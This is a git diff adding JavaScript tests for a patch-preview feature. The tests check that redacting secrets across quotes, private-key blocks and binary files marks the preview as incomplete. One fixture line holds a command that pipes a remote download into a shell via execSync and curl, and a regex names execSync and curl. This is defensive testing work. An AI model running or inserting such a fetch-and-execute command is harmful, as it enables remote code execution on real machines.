@@ -537,7 +537,7 @@ test('collect reports preview completeness (A1): clean is complete; lines the pr
   assert.deepEqual(hidden.secretHits, [], 'sec.secret_scan does not block them');
   assert.equal(hidden.preview.complete, false);
   assert.equal(hidden.preview.reason, 'hidden_lines');
-  assert.equal(hidden.preview.hiddenLines, 2);
+  assert.ok(hidden.preview.hiddenLines >= 2, 'the changed lines of the whole preview text');
   const text = JSON.stringify(hidden);
   assert.ok(!/authorization|execSync|curl|hunter22/.test(text), 'no line text anywhere in the facts');
   // A patch past the preview cap (2 x 1 MiB).
@@ -555,6 +555,70 @@ test('collect reports preview completeness (A1): clean is complete; lines the pr
   const cut = await collect(w4.g, w4.collectTask(), { dataRoot: w4.dataRoot, patchMaxBytes: 2048 });
   assert.equal(cut.preview.complete, false);
   assert.equal(cut.preview.reason, 'truncated');
+});
+
+// A1 whole-patch completeness: the preview redacts the WHOLE patch (a quoted value, a private-key block and an unterminated
+// key all run across newlines, and over context and removed lines), so completeness is judged on the preview's own text.
+async function previewOf(files, base = { 'a.txt': 'a\n' }, edit = null) {
+  const w = world(base);
+  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
+  if (edit) edit(w);
+  for (const [f, c] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(w.wt, f)), { recursive: true }); fs.writeFileSync(path.join(w.wt, f), c); }
+  return collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
+}
+
+test('A1 a quote opened on one added line and closed on another hides the lines between: incomplete, though no single line changes when redacted alone', async () => {
+  const { redactSecretText } = loadTs('src/main/nexus/activity/redact.ts');
+  const lines = ['// token = "', 'require(\'child_process\').execSync(\'curl http://x.invalid | sh\');', '// "'];
+  assert.ok(lines.every((l) => redactSecretText('+' + l) === '+' + l), 'each line alone is unchanged (what the old per-line count saw)');
+  const f = await previewOf({ 'x.js': lines.join('\n') + '\n' });
+  assert.equal(f.preview.complete, false);
+  assert.equal(f.preview.reason, 'hidden_lines');
+  assert.ok(f.preview.hiddenLines >= 1);
+  assert.ok(!/execSync|curl|token/.test(JSON.stringify(f)), 'counts only');
+});
+
+test('A1 an unclosed quote is closed by the next quote anywhere later in the patch (another file): incomplete', async () => {
+  const f = await previewOf({ 'a1.txt': '# password = "\n', 'b1.txt': 'console.log("hi");\n' });
+  assert.equal(f.preview.complete, false);
+  assert.equal(f.preview.reason, 'hidden_lines');
+});
+
+test('A1 a private-key header already in the repository, shown as context or removed, hides everything after it in the patch: incomplete', async () => {
+  const f = await previewOf({ 'k.txt': '-----BEGIN PRIVATE KEY-----\nAAAA\nchanged\nCCCC\nDDDD\n', 'z.js': 'doSomething();\n' }, { 'a.txt': 'a\n', 'k.txt': '-----BEGIN PRIVATE KEY-----\nAAAA\nBBBB\nCCCC\nDDDD\n' });
+  assert.deepEqual(f.secretHits, [], 'no ADDED line is a key: sec.secret_scan passes it');
+  assert.equal(f.preview.complete, false);
+  assert.equal(f.preview.reason, 'hidden_lines');
+});
+
+test('A1 the ordinary test-fixture line `password: \'x\'` is incomplete (not approvable from Nexus); a clean change is complete', async () => {
+  const fixture = await previewOf({ 't.js': 'const cfg = { password: \'x\' };\n' });
+  assert.equal(fixture.preview.complete, false);
+  assert.equal(fixture.preview.reason, 'hidden_lines');
+  const clean = await previewOf({ 't.js': 'const cfg = { retries: 3 };\n' });
+  assert.equal(clean.preview.complete, true);
+  assert.equal(clean.preview.hiddenLines, 0);
+});
+
+test('A1 a file git shows only as "Binary files differ" (a NUL byte) makes the preview incomplete (binary_file); the same text without the NUL is complete', async () => {
+  const withNul = await previewOf({ 'src/x.js': Buffer.concat([Buffer.from('const a = 1; // '), Buffer.from([0]), Buffer.from(' x\nrequire(\'./a\');\n')]) });
+  assert.equal(withNul.preview.complete, false);
+  assert.equal(withNul.preview.reason, 'binary_file');
+  assert.deepEqual(withNul.secretHits, []);
+  const plain = await previewOf({ 'src/x.js': 'const a = 1; //  x\nrequire(\'./a\');\n' });
+  assert.equal(plain.preview.complete, true);
+  assert.equal(plain.preview.reason, undefined);
+});
+
+test('previewText is the one transform (redaction, then only LONE surrogates replaced: a valid astral character stays whole)', () => {
+  const { previewText, PREVIEW_DIFF_ARGS } = GW;
+  const emoji = String.fromCodePoint(0x1f600);
+  assert.equal(previewText('a ' + emoji + ' b'), 'a ' + emoji + ' b');
+  assert.equal(previewText('x' + String.fromCharCode(0xd800) + 'y'), 'x' + String.fromCharCode(0xfffd) + 'y');
+  assert.deepEqual([...PREVIEW_DIFF_ARGS], ['diff', '--no-ext-diff', '--no-textconv', '--ignore-submodules=all', '--no-color', '--no-renames']);
+  const readSrc = fs.readFileSync(path.join(__dirname, '..', 'src', 'runner', 'gitRead.ts'), 'utf8');
+  assert.match(readSrc, /\.\.\.PREVIEW_DIFF_ARGS, task\.base, task\.head/, 'gitRead runs exactly the argv collect judges');
+  assert.match(readSrc, /previewText\(raw\.toString\('utf8'\)\)/, 'and the transform collect judges');
 });
 
 test('CS14 after the first change set is accepted, the next collect\'s base is the merge-base with the integration ref and its diffstat shows only the new work', async () => {
